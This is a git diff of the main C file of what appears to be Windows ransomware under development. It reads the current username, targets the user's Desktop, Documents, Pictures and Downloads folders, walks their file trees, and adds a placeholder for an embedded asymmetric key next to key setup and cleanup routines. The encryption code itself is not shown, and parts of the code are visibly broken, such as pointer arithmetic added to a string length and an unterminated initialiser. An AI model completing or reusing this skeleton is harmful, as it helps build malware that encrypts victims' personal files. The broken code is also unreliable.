@@ -1,22 +1,25 @@
 #include <stdio.h>
 #include <Windows.h>
 #include "keyDef.h"
-#include "keyInitialiser.h"
 #include "getTree.h"
-#include "encryptor.h"
-#include "keyCleaner.h"
 
 
 
 int main() {
 
+	// Setting variables
+	char initialPath[] = "C:\\Users\\";
+	char targetDirs[4][10] = {"Desktop", "Documents", "Pictures", "Downloads"};
+	BYTE asymKeyData[] = //ADD KEY HERE
+
+	// Initialize keys
 	key keyStruct = setupKeys();
 
-	//get username size 
+	// Get size of windows username 
 	LPDWORD userLenCheck = NULL;
 	GetUserNameA(NULL, &userLenCheck);
 	
-	//get username
+	// Get windows username for path
 	char* userName = (char*)malloc(userLenCheck + 1);
 	DWORD userLen = userLenCheck + 1;
 	if (!GetUserNameA(userName, &userLen)) {
@@ -24,12 +27,8 @@ int main() {
 	} else {
 		printf("\n(+) Succesfully got username %s", userName);
 	}
-	
-	//set dirs
-	char initialPath[] = "C:\\Users\\";
-	char targetDirs[4][10] = {"Desktop", "Documents", "Pictures", "Downloads"};
 
-	//iterate through dirs
+	// Iterate through target directories and get tree of folders
 	for (int i = 0; i < 1; i++) {
 
 		int pathLen = strlen(initialPath) + userName + strlen(targetDirs[i]) + 2;
@@ -47,9 +46,9 @@ int main() {
 		}
 	}
 
-	//cleanup
+	// Cleaning up buffer and keys
 	free(userName);
-	keyCleanup(keyStruct);
+	keyCleanup(keyStruct, asymKeyData);
 
 	return 0;
 }
